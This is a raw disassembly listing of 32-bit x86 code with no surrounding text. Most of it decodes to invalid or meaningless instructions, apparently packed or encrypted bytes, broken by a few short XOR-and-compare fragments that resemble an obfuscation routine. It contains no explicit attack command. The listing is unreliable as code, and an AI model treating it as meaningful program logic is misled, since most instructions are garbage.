  4081bf:	xor    eax,0x818807b
  4081c4:	dec    ebx
  4081c5:	mov    al,ds:0xa8b7d5ba
  4081ca:	mov    ecx,0xc90f3dc1
  4081cf:	mov    edx,0xf0294c6c
  4081d4:	test   eax,0xf77438d5
  4081d9:	cld    
  4081da:	inc    ebx
  4081db:	mov    ebp,DWORD PTR [edx]
  4081dd:	aaa    
  4081de:	call   DWORD PTR [eax-0x7f1a5279]
  4081e4:	sub    eax,0xd39129c
  4081e9:	lock dec ebp
  4081eb:	or     ah,BYTE PTR [edi]
  4081ed:	fsubrp st(2),st
  4081ef:	cld    
  4081f0:	in     eax,0x42
  4081f2:	je     0x40823d
  4081f4:	mov    cl,0xee
  4081f6:	cmp    eax,0x58dc698f
  4081fb:	stc    
  4081fc:	xchg   ecx,eax
  4081fd:	js     0x4081b9
  4081ff:	xlat   BYTE PTR ds:[ebx]
  408200:	or     edi,DWORD PTR [edi-0x678611e7]
  408206:	outs   dx,BYTE PTR ds:[esi]
  408207:	dec    eax
  408208:	mov    ebp,0x41f507d9
  40820d:	mov    bh,0xa8
  40820f:	int    0x11
  408211:	and    ah,al
  408213:	xor    eax,0x14fccdff
  408218:	jl     0x408297
  40821a:	cmp    eax,0x2a1a10be
  40821f:	pop    ebx
  408220:	hlt    
  408221:	add    DWORD PTR [edx+0x5f36e2fa],esp
  408227:	pushf  
  408228:	test   eax,0x2a983a3e
  40822d:	ja     0x408224
  40822f:	xor    eax,0x6da52d94
  408234:	popf   
  408235:	sti    
  408236:	cdq    
  408237:	rcr    BYTE PTR [esi+0x11fc968e],0x68
  40823e:	inc    esp
  40823f:	inc    esp
  408240:	jns    0x40823f
  408242:	or     dl,BYTE PTR [ebp+0x463f901f]
  408248:	je     0x4082be
  40824a:	mov    edx,0x91e8e131
  40824f:	daa    
  408250:	dec    ebp
  408251:	cmp    DWORD PTR cs:[edi+edi*1],ecx
  408255:	add    cl,BYTE PTR [esi]
  408257:	and    edi,DWORD PTR [eax-0x2a]
  40825a:	dec    ebp
  40825b:	dec    edi
  40825c:	mov    edi,0xfce224b7
  408261:	je     0x4082ae
  408263:	xlat   BYTE PTR ds:[ebx]
  408264:	push   esp
  408265:	pop    ecx
  408266:	mov    edi,0xe0e85283
  40826b:	repz jmp 0xcb84a57a
  408271:	pop    ebp
  408272:	(bad)  
  408273:	mov    esp,0xb9eb9979
  408278:	aam    0xbb
  40827a:	dec    edx
  40827b:	daa    
  40827c:	stos   BYTE PTR es:[edi],al
  40827d:	sbb    esi,ecx
  40827f:	in     al,0x76
  408281:	add    bl,ah
  408283:	pushf  
  408284:	push   ebp
  408285:	sbb    ebp,ecx
  408287:	mov    bl,cl
  408289:	cmp    BYTE PTR [ecx+ecx*4-0x2150693e],bl
  408290:	and    BYTE PTR [edx-0x7e],al
  408293:	es leave 
  408295:	add    eax,0x22be1255
  40829a:	add    al,0xf8
  40829c:	mov    dh,0xb5
  40829e:	stos   DWORD PTR es:[edi],eax
  40829f:	ss pushf 
  4082a1:	or     DWORD PTR ds:0x51856d40,ecx
  4082a7:	outs   dx,DWORD PTR ds:[esi]
  4082a8:	in     eax,0xde
  4082aa:	mov    al,0xc6
  4082ac:	in     eax,0x2e
  4082ae:	cs pop esi
  4082b0:	pop    ds
  4082b1:	popf   
  4082b2:	jae    0x40827c
  4082b4:	xchg   ebp,eax
  4082b5:	or     esp,DWORD PTR [eax+0x327d152f]
  4082bb:	add    eax,0xb241134e
  4082c0:	retf   0xaab5
  4082c3:	pushf  
  4082c4:	stos   BYTE PTR es:[edi],al
  4082c5:	data16 addr16 jno 0x40825c
  4082c9:	jp     0x408332
  4082cb:	(bad)  
  4082cc:	jmp    0x4082bb
  4082ce:	sbb    DWORD PTR [ecx+0x3f],edx
  4082d1:	dec    edx
  4082d2:	(bad)  
  4082d3:	fisub  WORD PTR [esi]
  4082d5:	nop
  4082d6:	repnz mov esi,0xdab7cd40
  4082dc:	pusha  
  4082dd:	and    eax,0x99cd63fc
  4082e2:	mov    al,0x27
  4082e4:	out    0xb7,al
  4082e6:	jnp    0x4082c1
  4082e8:	jbe    0x40835c
  4082ea:	push   ebx
  4082eb:	es loop 0x408337
  4082ee:	cmp    cl,BYTE PTR [ebx-0x4d]
  4082f1:	mov    bl,0x6d
  4082f3:	jbe    0x4082c4
  4082f5:	imul   edi,DWORD PTR [ebx+eiz*2],0x3d2decaf
  4082fc:	lds    eax,FWORD PTR [edx-0x397a39a0]
  408302:	sub    esi,ebp
  408304:	les    edx,FWORD PTR [ebp-0x20e9d60c]
  40830a:	inc    esp
  40830b:	(bad)  
  40830c:	cmp    ebx,DWORD PTR [esi]
  40830e:	dec    eax
  40830f:	inc    eax
  408310:	in     eax,0xe0
  408312:	fidivr WORD PTR [eax+0x80283eb]
  408318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408319:	xor    ecx,DWORD PTR [ebp-0x3d]
  40831c:	xchg   esp,eax
  40831d:	in     al,dx
  40831e:	mov    esi,DWORD PTR [ebp-0x16923371]
  408324:	arpl   WORD PTR [edi-0x23],cx
  408327:	aaa    
  408328:	jl     0x4082f2
  40832a:	xor    DWORD PTR [ebx-0x5d753e35],esi
  408330:	aad    0xe1
  408332:	iret   
  408333:	lods   al,BYTE PTR ds:[esi]
  408334:	inc    esi
  408335:	add    dl,dl
  408337:	arpl   WORD PTR [ebx-0xc066df4],si
  40833d:	push   ds
  40833e:	mov    al,0x6a
  408340:	(bad)  
  408341:	xor    ecx,ebx
  408343:	fsub   st(1),st
  408345:	pop    edi
  408346:	jns    0x4082e7
  408348:	pop    ebx
  408349:	mov    dl,0x1b
  40834b:	inc    ebx
  40834c:	push   edi
  40834d:	dec    edx
  40834e:	outs   dx,DWORD PTR ds:[esi]
  40834f:	nop
  408350:	mov    edx,0xa76e147d
  408355:	add    eax,0xbf4b4f83
  40835a:	jbe    0x40831f
  40835c:	lods   al,BYTE PTR ds:[esi]
  40835d:	sub    BYTE PTR [eax-0x4],bh
  408360:	je     0x4082f8
  408362:	es dec esi
  408364:	jne    0x4083a4
  408366:	mov    eax,0x67ad9010
  40836b:	arpl   WORD PTR [edx+0x77e57533],bp
  408371:	cmp    edi,ebp
  408373:	call   0xaf397d69
  408378:	mov    eax,0x40ba6f52
  40837d:	fucomp st(6)
  40837f:	fistp  QWORD PTR [ebp-0xb9a1e73]
  408385:	push   esp
  408386:	mov    ebp,0x34862c12
  40838b:	xor    eax,0x7966351b
  408390:	adc    dh,BYTE PTR [esi-0x223d0955]
  408396:	aad    0xdc
  408398:	repz pop edx
  40839a:	ja     0x4083e8
  40839c:	inc    edi
  40839d:	scas   al,BYTE PTR es:[edi]
  40839e:	clc    
  40839f:	cld    
  4083a0:	shr    DWORD PTR [edi-0x641cb0e4],cl
  4083a6:	jne    0x4083fc
  4083a8:	sub    eax,DWORD PTR [esi+0x53]
  4083ab:	jnp    0x40838f
  4083ad:	dec    edx
  4083ae:	jns    0x408396
  4083b0:	sti    
  4083b1:	mov    ebx,es
  4083b3:	das    
  4083b4:	scas   eax,DWORD PTR es:[edi]
  4083b5:	push   esi
  4083b6:	fild   WORD PTR [ecx]
  4083b8:	push   ecx
  4083b9:	fcom   QWORD PTR [esi+0x1b68cff9]
  4083bf:	or     ecx,DWORD PTR [esi+eax*8-0x5a]
  4083c3:	adc    dh,BYTE PTR [edi+0x1eeb750d]
  4083c9:	pop    ebp
  4083ca:	inc    ebp
  4083cb:	ror    BYTE PTR [ecx],cl
  4083cd:	xchg   ebp,eax
  4083ce:	push   eax
  4083cf:	popf   
  4083d0:	mov    al,ds:0x351ed8fa
  4083d5:	ret    
  4083d6:	(bad)  
  4083d7:	out    0xd7,eax
  4083d9:	inc    esi
  4083da:	adc    DWORD PTR [esi-0x6bb6320f],esi
  4083e0:	and    al,BYTE PTR [edx]
  4083e2:	mov    cl,0x8
  4083e4:	outs   dx,DWORD PTR ds:[esi]
  4083e5:	(bad)  
  4083e6:	sahf   
  4083e7:	mov    dl,0x2a
  4083e9:	or     al,0x4b
  4083eb:	fs repz int 0x3d
  4083ef:	retf   0x8183
  4083f2:	dec    edx
  4083f3:	push   0xffffffb2
  4083f5:	push   ebx
  4083f6:	or     dl,al
  4083f8:	je     0x408462
  4083fa:	inc    esp
  4083fb:	adc    al,0x3c
  4083fd:	in     eax,dx
  4083fe:	push   ebp
  4083ff:	push   esp
  408400:	fisttp QWORD PTR [edi-0x1b60ec44]
  408406:	addr16 jmp 0x40841c
  408409:	and    eax,0x2cb29350
  40840e:	jae    0x408404
  408410:	fsubp  st(0),st
  408412:	popf   
  408413:	fld    st(3)
  408415:	cdq    
  408416:	loope  0x408416
  408418:	jns    0x4083f2
  40841a:	mov    ch,0xf6
  40841c:	les    eax,FWORD PTR [edi]
  40841e:	mov    esp,0x1303fe0f
  408423:	adc    BYTE PTR [ecx+0x40],dl
  408426:	push   esp
  408427:	lock into 
  408429:	outs   dx,DWORD PTR ds:[esi]
  40842a:	scas   eax,DWORD PTR es:[edi]
  40842b:	xor    BYTE PTR [edi],ah
  40842d:	sti    
  40842e:	mov    ebp,0x31aaab33
  408433:	loop   0x40841e
  408435:	pusha  
  408436:	pop    ecx
  408437:	push   es
  408438:	adc    BYTE PTR [eax+ecx*8],cl
  40843b:	jns    0x4083ee
  40843d:	jge    0x40849b
  40843f:	retf   0x8087
  408442:	ja     0x40842c
  408444:	cmp    eax,0x60
  408447:	fisttp DWORD PTR [edi-0xf214c03]
  40844d:	add    DWORD PTR [ebp+0x7d],esi
  408450:	push   es
  408451:	repz push edi
  408453:	into   
  408454:	fstp   QWORD PTR [edx]
  408456:	adc    BYTE PTR [ebx-0x62],0x59
  40845a:	repnz into 
  40845c:	(bad)  
  40845d:	adc    DWORD PTR [edx+0x11],edx
  408460:	sub    eax,0x583f146f
  408465:	nop
  408466:	or     dl,0x21
  408469:	sub    bh,0x5b
  40846c:	xlat   BYTE PTR ds:[ebx]
  40846d:	sub    BYTE PTR [esi-0x60],dh
  408470:	lahf   
  408471:	repnz cmp eax,DWORD PTR fs:[ebx+0x7edfee02]
  408479:	push   es
  40847a:	test   DWORD PTR [ebp+0x36],ebp
  40847d:	stos   BYTE PTR es:[edi],al
  40847e:	inc    edx
  40847f:	add    ebx,eax
  408481:	jne    0x40844a
  408483:	rcr    BYTE PTR [edx-0x43f69e50],1
  408489:	xor    ebp,DWORD PTR [eax]
  40848b:	add    DWORD PTR [ecx],edx
  40848d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40848e:	lock adc eax,0x5499dec4
  408494:	adc    dh,BYTE PTR [edi-0x7f7b40ef]
  40849a:	adc    BYTE PTR [ebp+0x416bf213],bh
  4084a0:	mov    eax,ds:0x92622042
  4084a5:	xchg   ebx,eax
  4084a6:	enter  0x2f00,0x7d
  4084aa:	xor    eax,DWORD PTR [esi+esi*1-0x53]
  4084ae:	and    ch,bl
  4084b0:	pop    ds
  4084b1:	push   ss
  4084b2:	xor    ecx,DWORD PTR [ebx]
  4084b4:	and    ch,BYTE PTR [ebx+eax*8]
  4084b7:	dec    edx
  4084b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084b9:	pop    es
  4084ba:	mov    eax,DWORD PTR [ebp-0x8]
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	test   eax,0x32351861
  408513:	fidivr WORD PTR [esp+edi*2-0x29]
  408517:	jns    0x408595
  408519:	jl     0x408549
  40851b:	dec    ebx
  40851c:	sub    BYTE PTR [ecx+edi*4],dl
  40851f:	stos   DWORD PTR es:[edi],eax
  408520:	sub    al,0xd0
  408522:	je     0x4084b5
  408524:	fldcw  WORD PTR [ecx+0x2c2b32d5]
  40852a:	mov    esi,0x7ef65d77
  40852f:	xchg   ebp,eax
  408530:	lea    ecx,[eax]
  408532:	imul   ecx,ebx,0xffffffb2
  408535:	std    
  408536:	and    eax,0x8ce6bc8a
  40853b:	imul   esi,DWORD PTR [ecx-0x4d],0xffffffc7
  40853f:	jmp    0x26a0:0x5eade0de
  408546:	outs   dx,DWORD PTR ds:[esi]
  408547:	sti    
  408548:	xor    dh,BYTE PTR [eax-0x2]
  40854b:	xchg   DWORD PTR [ebx+0x13312817],esi
  408551:	xor    eax,0xe0a52d60
  408556:	popf   
  408557:	mov    edx,ebx
  408559:	jg     0x4085b1
  40855b:	int3   
  40855c:	push   esi
  40855d:	inc    edi
  40855e:	pop    DWORD PTR [ecx-0x65449b59]
  408564:	idiv   DWORD PTR [esi+0x2a]
  408567:	(bad)  
  408568:	sbb    DWORD PTR [edx],esp
  40856a:	sub    dh,bh
  40856c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40856d:	cmp    dl,ah
  40856f:	test   BYTE PTR [esi+0x67],dh
  408572:	call   0xe744444b
  408577:	fst    st(7)
  408579:	inc    eax
  40857a:	fimul  DWORD PTR [ebp-0x28]
  40857d:	mov    cl,dl
  40857f:	rcr    BYTE PTR [edi-0x3a103cd2],1
  408585:	aaa    
  408586:	inc    ebp
  408587:	push   ecx
  408588:	mov    ds:0x25a0cd43,eax
  40858d:	add    esi,edi
  40858f:	cmp    eax,0x204eee8
  408594:	nop
  408595:	pop    esi
  408596:	or     eax,0xab68246f
  40859b:	cli    
  40859c:	sub    edi,DWORD PTR [eax]
  40859e:	imul   edi,DWORD PTR [edi+0x30625f16],0x637f6964
  4085a8:	dec    esi
  4085a9:	cmp    ah,BYTE PTR [edx]
  4085ab:	jmp    0x408533
  4085ad:	test   DWORD PTR [edi-0x468863f],ecx
  4085b3:	pop    ecx
  4085b4:	push   edx
  4085b5:	xor    al,BYTE PTR [ecx+0x5e09a7f4]
  4085bb:	loopne 0x4085f9
  4085bd:	mov    esp,0xde4b52c
  4085c2:	pop    edi
  4085c3:	popa   
  4085c4:	loope  0x40855d
  4085c6:	xor    al,0x97
  4085c8:	sahf   
  4085c9:	and    eax,0xbc440261
  4085ce:	mov    edi,0x5ab30c98
  4085d3:	dec    ebx
  4085d4:	fild   DWORD PTR [edi-0x2f4a43d3]
  4085da:	dec    ebp
  4085db:	(bad)  
  4085dc:	cwde   
  4085dd:	std    
  4085de:	dec    edi
  4085df:	test   al,0xbf
  4085e1:	shl    BYTE PTR [edx],0x9d
  4085e4:	ss xchg esp,eax
  4085e6:	mov    al,ds:0x33fecba5
  4085eb:	imul   ebp,DWORD PTR [esi-0x641a90f0],0x39ba4f7b
  4085f5:	xchg   esi,eax
  4085f6:	(bad)  
  4085f7:	jne    0x4085a5
  4085f9:	xchg   esi,eax
  4085fa:	into   
  4085fb:	inc    esp
  4085fc:	and    dh,BYTE PTR [edi+ebx*1+0x3bab83c4]
  408603:	not    eax
  408605:	jae    0x1b82e05c
  40860b:	xchg   ecx,eax
  40860c:	sbb    BYTE PTR [edx+0x2a],cl
  40860f:	call   0x20df5dbe
  408614:	xchg   edx,eax
  408615:	mov    bh,0x3
  408617:	fist   DWORD PTR [ecx+0xe6656fb]
  40861d:	adc    DWORD PTR [esi],ecx
  40861f:	cdq    
  408620:	and    eax,0xb10ffccb
  408625:	mov    bl,0xfe
  408627:	test   bh,dl
  408629:	in     al,0x97
  40862b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40862c:	adc    al,BYTE PTR [esi]
  40862e:	mov    WORD PTR [edi-0x7adc9c1c],es
  408634:	cwde   
  408635:	mov    al,0xcf
  408637:	jnp    0x408645
  408639:	xor    ah,ch
  40863b:	stos   DWORD PTR es:[edi],eax
  40863c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40863d:	jnp    0x40868d
  40863f:	jmp    0xe5fb:0x1922df91
  408646:	ins    DWORD PTR es:[edi],dx
  408647:	clc    
  408648:	popa   
  408649:	je     0x408657
  40864b:	or     eax,0x8ec13d27
  408650:	sar    BYTE PTR [edi+0x66],cl
  408653:	jp     0x408643
  408655:	add    bh,dl
  408657:	sub    al,0x2d
  408659:	mov    eax,ds:0x7df42705
  40865e:	enter  0x8152,0xa8
  408662:	cmc    
  408663:	add    al,0x13
  408665:	jns    0x40867c
  408667:	mul    DWORD PTR [eax]
  408669:	mov    es:0x4e46680b,al
  40866f:	dec    ebx
  408670:	cdq    
  408671:	and    al,0x2
  408673:	mov    ?,WORD PTR [edi]
  408675:	dec    eax
  408676:	mov    ds:0xb4e3c561,eax
  40867b:	js     0x4086e0
  40867d:	sbb    BYTE PTR [ecx],cl
  40867f:	clc    
  408680:	sub    ebx,ebx
  408682:	out    dx,al
  408683:	mov    ds:0x3db2093f,al
  408688:	and    al,0x91
  40868b:	adc    dl,BYTE PTR [edi+0x6f]
  40868e:	dec    edx
  40868f:	(bad)  
  408690:	lods   al,BYTE PTR ds:[esi]
  408691:	ja     0x4086d4
  408693:	inc    edx
  408694:	mov    al,ds:0xbf8c4301
  408699:	adc    al,BYTE PTR [ebp+edx*2+0x2c]
  40869d:	int3   
  40869e:	inc    eax
  40869f:	push   ds
  4086a0:	mov    esi,0xca5aa168
  4086a5:	gs lahf 
  4086a7:	pop    ecx
  4086a8:	and    al,BYTE PTR [edi+0x1e]
  4086ab:	sbb    ebx,0xffffffcf
  4086ae:	test   eax,0x537f9643
  4086b3:	mov    eax,ds:0xce55d31c
  4086b8:	push   ecx
  4086b9:	push   0xffffffab
  4086bb:	and    DWORD PTR [ecx+0x5be566f0],esi
  4086c1:	fcmovne st,st(0)
  4086c3:	cmp    esi,esi
  4086c5:	loopne 0x408686
  4086c7:	push   edi
  4086c8:	das    
  4086c9:	into   
  4086ca:	sub    eax,0xa2da72d8
  4086cf:	mul    BYTE PTR [edx+esi*8-0x72d033d9]
  4086d6:	retf   
  4086d7:	xor    ebp,DWORD PTR [edx]
  4086d9:	dec    edx
  4086da:	dec    ebp
  4086db:	add    ebp,DWORD PTR [ecx-0x23]
  4086de:	and    ah,al
  4086e0:	out    0xae,eax
  4086e2:	pop    ds
  4086e3:	add    dl,bh
  4086e5:	sbb    DWORD PTR [ebx+0x48],0xffffffbe
  4086e9:	int3   
  4086ea:	mov    WORD PTR [edx+0xe],ss
  4086ed:	test   al,0xd3
  4086ef:	adc    BYTE PTR [ebp-0x48b52e4d],bh
  4086f5:	enter  0xdabe,0x1d
  4086f9:	or     bl,0x82
  4086fc:	cmc    
  4086fd:	inc    esp
  4086fe:	xchg   edi,eax
  4086ff:	push   ebx
  408700:	mov    bh,0xcd
  408702:	pop    ds
  408703:	sbb    cl,bl
  408705:	push   ss
  408706:	jmp    DWORD PTR [edi+edx*1+0x6a]
  40870a:	leave  
  40870b:	imul   ebx,DWORD PTR [ebx+ebx*2],0xffffff92
  40870f:	add    DWORD PTR [eax],ebp
  408711:	or     esi,ecx
  408713:	xchg   DWORD PTR [ecx],ecx
  408715:	and    eax,0x6c1dd9e4
  40871a:	or     al,0xa3
  40871c:	or     esi,esp
  40871e:	mov    edx,0x5cfc3688
  408723:	cs sbb eax,0x27e1b58d
  408729:	fldcw  WORD PTR [eax+0x36]
  40872c:	cmp    edi,DWORD PTR [ebx+ecx*4+0x68]
  408730:	mov    eax,0x32bc77dd
  408735:	mov    dl,0x10
  408737:	cs pop ecx
  408739:	pop    eax
  40873a:	pop    esi
  40873b:	mov    ebp,0xe566ab94
  408740:	dec    edi
  408741:	inc    esp
  408742:	jno    0x4086c8
  408744:	div    BYTE PTR [ecx]
  408746:	retf   
  408747:	(bad)  
  408748:	xor    BYTE PTR [edx+0x38],cl
  40874b:	(bad)
  40874f:	ds jmp 0x4086d4
  408752:	push   edx
  408753:	dec    esi
  408754:	scas   al,BYTE PTR es:[edi]
  408755:	jg     0x408702
  408757:	lods   eax,DWORD PTR ds:[esi]
  408758:	adc    DWORD PTR [esi+0x2d],esi
  40875b:	mov    esp,DWORD PTR es:0x410577a1
  408762:	test   al,0xf0
  408764:	cmp    al,0xe5
  408766:	pop    edi
  408767:	rcpps  xmm2,XMMWORD PTR [eax*2-0x7bc05f1b]
  40876f:	jne    0x4087be
  408771:	icebp  
  408772:	xlat   BYTE PTR ds:[ebx]
  408773:	xlat   BYTE PTR ds:[ebx]
  408774:	xchg   esi,eax
  408775:	mov    edi,0xb484bfb7
  40877a:	adc    BYTE PTR [edx+0x57],bh
  40877d:	pop    esi
  40877e:	mov    bl,0x9b
  408780:	fwait
  408781:	xchg   DWORD PTR [eax],eax
  408783:	push   0x35
  408785:	mov    al,0xf
  408787:	mov    al,0x81
  408789:	ins    BYTE PTR es:[edi],dx
  40878a:	cmp    ecx,ecx
  40878c:	inc    esi
  40878d:	ficomp WORD PTR [ecx*4-0x62ba193c]
  408794:	pop    ebp
  408795:	push   esp
  408796:	xchg   edi,eax
  408797:	data16 xlat BYTE PTR ds:[ebx]
  408799:	mov    ebx,ecx
  40879b:	xchg   edx,eax
  40879c:	mov    dh,0xfb
  40879e:	(bad)  
  40879f:	inc    bx
  4087a1:	and    BYTE PTR [ebx-0x3a],bl
  4087a4:	mov    ebp,0x6e04298e
  4087a9:	scas   al,BYTE PTR es:[edi]
  4087aa:	adc    BYTE PTR [ecx-0x5fc427],cl
  4087b0:	mov    al,0x6
  4087b2:	(bad)  
  4087b3:	retf   0xc07c
  4087b6:	add    al,0xed
  4087b8:	mov    BYTE PTR [eax],cl
  4087ba:	mov    cl,0x1f
  4087bc:	pop    esp
  4087bd:	jg     0x40878a
  4087bf:	mov    esp,0x1f2274a7
  4087c4:	addr16 cmp al,0x2d
  4087c7:	int    0x64
  4087c9:	loop   0x4087b7
  4087cb:	js     0x408798
  4087cd:	mov    edi,0xb123e867
  4087d2:	outs   dx,BYTE PTR ds:[esi]
  4087d3:	xor    eax,0x8f7db5d5
  4087d8:	or     bh,cl
  4087da:	sub    edx,edi
  4087dc:	jmp    0x40877d
  4087de:	test   al,0x97
  4087e0:	test   DWORD PTR [edi-0x6e],edi
  4087e3:	xor    eax,0xb5e2921e
  4087e8:	dec    esi
  4087e9:	iret   
  4087ea:	outs   dx,BYTE PTR ds:[esi]
  4087eb:	push   0xffffff98
  4087ed:	jle    0x4087b3
  4087ef:	call   0x9f06:0x318b6188
  4087f6:	and    eax,0xffffffbc
  4087f9:	pop    ds
  4087fa:	adc    al,al
  4087fc:	mov    dh,0x62
  4087fe:	pop    ds
  4087ff:	lock xor DWORD PTR [eax+0x61],eax
  408803:	jnp    0x4087e1
  408805:	push   0x8125d0f0
  40880a:	int3   
  40880b:	xchg   esi,eax
  40880c:	mov    eax,ds:0xbe1e36ad
  408811:	mov    dh,0x15
  408813:	cwde   
  408814:	ss push es
  408816:	jne    0x4087f3
  408818:	add    al,0xd6
  40881a:	test   eax,0xc82d1e4
  40881f:	out    dx,al
  408820:	push   edx
  408821:	mov    ebp,0xa9645c4c
  408826:	sub    BYTE PTR [edx],ah
  408828:	popf   
  408829:	jl     0x4087d3
  40882b:	and    edx,edx
  40882d:	or     edx,DWORD PTR [edi]
  40882f:	sub    BYTE PTR [esi-0x7bec6e98],dh
  408835:	xor    BYTE PTR [ebp+0x30],bh
  408838:	adc    ecx,DWORD PTR [eax-0x7c]
  40883b:	sub    edx,esi
  40883d:	push   ecx
  40883e:	pop    es
  40883f:	sub    BYTE PTR [edi],cl
  408841:	rcl    DWORD PTR [ecx+0x23],cl
  408844:	aam    0x16
  408846:	push   esp
  408847:	cmp    DWORD PTR [edx-0x7a],ebp
  40884a:	jl     0x408818
  40884c:	fs mov esi,0x18611a9e
  408852:	addr16 mov ebp,ebp
  408855:	pop    esi
  408856:	and    BYTE PTR [ecx-0x22],ah
  408859:	sbb    eax,0xd3ad1b98
  40885e:	pop    esp
  40885f:	inc    ebx
  408860:	mov    al,ds:0x607d559c
  408865:	xchg   esi,eax
  408866:	mov    edx,0x229bc9ac
  40886b:	xor    DWORD PTR [esi],esp
  40886d:	add    DWORD PTR ds:0x5ac750e5,0xfa8f3081
  408877:	push   eax
  408878:	es jmp 0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0xc2
  4088df:	fs jo  0x408863
  4088e2:	xchg   ebp,eax
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x408878
  4088eb:	bound  ecx,QWORD PTR ds:0x69c17068
  4088f1:	adc    ebx,DWORD PTR [ebp+0x7d005fd7]
  4088f7:	test   DWORD PTR [ecx-0x7d40554c],edi
  4088fd:	mov    ch,0xce
  4088ff:	xor    DWORD PTR [eax],ecx
  408901:	aad    0x2f
  408903:	pop    es
  408904:	je     0x40897d
  408906:	ins    BYTE PTR es:[edi],dx
  408907:	xor    esp,DWORD PTR [eax+edx*2]
  40890a:	aad    0xe2
  40890c:	rcl    DWORD PTR [ebp+ebp*8-0x7ff4d16],1
  408913:	sub    ch,BYTE PTR [edx+edi*2-0x57]
  408917:	and    eax,0x77eafbfb
  40891c:	fild   DWORD PTR [ebp-0x4]
  40891f:	rol    ebp,cl
  408921:	xchg   BYTE PTR [esi+0x77],dl
  408924:	(bad)  
  408925:	enter  0xd90b,0x9e
  408929:	and    dl,BYTE PTR ss:[ecx-0x36]
  40892d:	fs dec edx
  40892f:	adc    eax,0xaf54cfa2
  408934:	cli    
  408935:	mov    WORD PTR [esi+0x253634c4],ds
  40893b:	push   ds
  40893c:	out    0xe8,al
  40893e:	and    DWORD PTR [ebx+ebp*1+0x70e64f5d],edi
  408945:	loope  0x408908
  408947:	sub    eax,eax
  408949:	test   al,0xbf
  40894b:	sub    ebp,0x3d
  40894e:	push   0x24
  408950:	jne    0x4088da
  408952:	push   ds
  408953:	cli    
  408954:	push   ebp
  408955:	gs iret 
  408957:	pop    ecx
  408958:	sbb    BYTE PTR [ecx+esi*2],dh
  40895b:	cmp    ch,BYTE PTR [ecx]
  40895d:	or     dh,BYTE PTR [eax]
  40895f:	jmp    0x25b8:0x5094050a
  408966:	int3   
  408967:	rol    BYTE PTR [ecx],1
  408969:	dec    eax
  40896a:	xchg   ecx,eax
  40896b:	push   ss
  40896c:	jp     0x4089b9
  40896e:	fsubr  st,st(4)
  408970:	sub    al,0x74
  408972:	add    al,BYTE PTR [ebp-0x26]
  408975:	cmp    ah,BYTE PTR [eax*1+0x5367c06f]
  40897c:	add    bl,BYTE PTR [ecx-0x4]
  40897f:	dec    DWORD PTR [edi-0x62]
  408982:	test   DWORD PTR [eax-0x2b],ecx
  408985:	cwde   
  408986:	mov    al,BYTE PTR [ebp-0x370dca98]
  40898c:	cmp    eax,0x365b7d7c
  408991:	xor    ah,dl
  408993:	push   ds
  408994:	aas    
  408995:	dec    ecx
  408996:	jl     0x4089a9
  408998:	xchg   edx,eax
  408999:	push   0x79ac429c
  40899e:	xchg   edx,eax
  40899f:	dec    eax
  4089a0:	inc    ebp
  4089a1:	or     DWORD PTR ds:0x90c34d75,eax
  4089a7:	push   ebp
  4089a8:	fadd   DWORD PTR ds:0x4dbcb85
  4089ae:	add    al,0x36
  4089b0:	in     eax,0x65
  4089b2:	and    al,0x2e
  4089b4:	stos   DWORD PTR es:[edi],eax
  4089b5:	scas   al,BYTE PTR es:[edi]
  4089b6:	bound  edx,QWORD PTR [esi-0x48]
  4089b9:	sbb    DWORD PTR [eax+0x4f],edi
  4089bc:	retf   0x1b84
  4089bf:	xor    eax,0x2b202c2d
  4089c4:	scas   eax,DWORD PTR es:[edi]
  4089c5:	push   ds
  4089c6:	add    esp,DWORD PTR [eax+ecx*4+0x13]
  4089ca:	push   esi
  4089cb:	clc    
  4089cc:	iret   
  4089cd:	retf   0xadb1
  4089d0:	int3   
  4089d1:	int3   
